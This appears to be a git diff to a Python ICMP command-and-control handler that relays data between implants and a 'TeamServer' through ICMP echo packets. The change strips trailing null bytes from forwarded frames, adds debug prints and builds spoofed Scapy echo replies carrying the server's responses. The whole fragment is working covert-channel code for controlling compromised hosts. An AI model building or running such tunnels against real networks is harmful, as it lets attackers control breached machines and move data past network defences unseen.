@@ -84,15 +84,18 @@ class ICMP_C2_Handler:
 
         # seq > 0: forward to TeamServer as before…
         print(f"[+] Forwarding data‐frame (seq {icmp_seq}) to TeamServer…")
-        self.send_frame(payload_after_tag)
+        # NEED TO STRIP the \x00 here, otherwise team server breaks (encryption things & length)
+        print(f"Payload: {payload_after_tag.rstrip(b"\x00")}")
+        self.send_frame(payload_after_tag.rstrip(b"\x00"))
         teamserver_response = self.recv_frame()
 
-        reply_payload = ICMP_TAG.encode() + teamserver_response
+        data_from_teamserver = ICMP_TAG.encode() + teamserver_response
+        print(f"TeamServer Says: {data_from_teamserver}")
         print("[+] Sending simple ICMP‐reply with TeamServer’s response…")
         reply = (
             IP(dst=ip_src, src=ip_dst) /
             ICMP(type=0, id=icmp_id, seq=icmp_seq) /
-            Raw(load=reply_payload)
+            Raw(load=data_from_teamserver)
         )
         send(reply, verbose=False)
         print(f"[+] Replied to {ip_src} with TeamServer’s data")
